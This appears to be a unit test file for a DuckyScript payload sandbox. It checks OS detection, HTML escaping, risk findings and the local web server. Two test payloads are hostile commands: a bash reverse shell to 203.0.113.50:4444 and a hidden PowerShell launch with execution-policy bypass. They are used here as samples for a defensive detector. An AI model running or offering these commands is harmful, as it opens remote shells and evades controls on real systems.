import json
import threading
import unittest
import urllib.error
import urllib.parse
import urllib.request

from duckysandbox import webapp
from duckysandbox.emulator import EmulationResult


class TestAnalyzePayload(unittest.TestCase):
    def test_auto_detects_os_when_choice_is_auto(self):
        result = webapp.analyze_payload("STRING bash -i >& /dev/tcp/203.0.113.50/4444 0>&1\nENTER\n", "auto")
        self.assertIsInstance(result, EmulationResult)
        self.assertEqual(result.target_os, "linux")

    def test_explicit_os_choice_is_honoured(self):
        result = webapp.analyze_payload("STRING whoami\nENTER\n", "macos")
        self.assertEqual(result.target_os, "macos")

    def test_invalid_os_choice_falls_back_to_auto_detect(self):
        result = webapp.analyze_payload("STRING whoami\nENTER\n", "not-a-real-os")
        self.assertEqual(result.target_os, "windows")


class TestRenderIndexPage(unittest.TestCase):
    def test_index_page_has_form_and_samples(self):
        page = webapp.render_index_page()
        self.assertIn('<form class="duck-form"', page)
        self.assertIn('name="payload"', page)
        self.assertIn('id="sample-select"', page)
        for key in webapp.SAMPLES:
            self.assertIn(f'"{key}"', page)

    def test_payload_text_is_escaped_in_textarea(self):
        page = webapp.render_index_page(payload_text="STRING <b>hi</b>\n")
        self.assertNotIn("<b>hi</b>", page)
        self.assertIn("&lt;b&gt;hi&lt;/b&gt;", page)

    def test_error_message_rendered(self):
        page = webapp.render_index_page(error="Paste a payload before analyzing.")
        self.assertIn("Paste a payload before analyzing.", page)
        self.assertIn("form-error", page)

    def test_result_html_embedded(self):
        page = webapp.render_index_page(result_html="<section>RESULT MARKER</section>")
        self.assertIn("RESULT MARKER", page)


class TestWebServer(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server = webapp.build_server("127.0.0.1", 0)
        cls.host, cls.port = cls.server.server_address
        cls.thread = threading.Thread(target=cls.server.serve_forever, daemon=True)
        cls.thread.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.thread.join()

    def _url(self, path):
        return f"http://{self.host}:{self.port}{path}"

    def test_index_page_served(self):
        with urllib.request.urlopen(self._url("/")) as resp:
            self.assertEqual(resp.status, 200)
            body = resp.read().decode()
        self.assertIn("DuckyScript Behaviour Sandbox", body)

    def test_analyze_html(self):
        data = urllib.parse.urlencode({
            "payload": "STRING powershell -nop -w hidden -ep bypass -Command whoami\nENTER\n",
            "target_os": "windows",
            "format": "html",
        }).encode()
        req = urllib.request.Request(self._url("/analyze"), data=data, method="POST")
        with urllib.request.urlopen(req) as resp:
            self.assertEqual(resp.status, 200)
            body = resp.read().decode()
        self.assertIn("EXEC-PS", body)
        self.assertIn("risk-banner", body)

    def test_analyze_json_download(self):
        data = urllib.parse.urlencode({
            "payload": "STRING whoami\nENTER\n",
            "target_os": "windows",
            "format": "json",
        }).encode()
        req = urllib.request.Request(self._url("/analyze"), data=data, method="POST")
        with urllib.request.urlopen(req) as resp:
            self.assertEqual(resp.status, 200)
            self.assertEqual(resp.headers.get("Content-Type"), "application/json")
            self.assertIn("attachment", resp.headers.get("Content-Disposition", ""))
            payload = json.loads(resp.read().decode())
        self.assertIn("DISC-WHOAMI", {f["rule_id"] for f in payload["findings"]})

    def test_empty_payload_shows_error(self):
        data = urllib.parse.urlencode({"payload": "", "target_os": "auto", "format": "html"}).encode()
        req = urllib.request.Request(self._url("/analyze"), data=data, method="POST")
        with urllib.request.urlopen(req) as resp:
            body = resp.read().decode()
        self.assertIn("Paste a payload before analyzing.", body)

    def test_unknown_path_is_404(self):
        with self.assertRaises(urllib.error.HTTPError) as ctx:
            urllib.request.urlopen(self._url("/nope"))
        self.assertEqual(ctx.exception.code, 404)

    def test_unknown_post_path_is_404(self):
        req = urllib.request.Request(self._url("/nope"), data=b"", method="POST")
        with self.assertRaises(urllib.error.HTTPError) as ctx:
            urllib.request.urlopen(req)
        self.assertEqual(ctx.exception.code, 404)


if __name__ == "__main__":
    unittest.main()
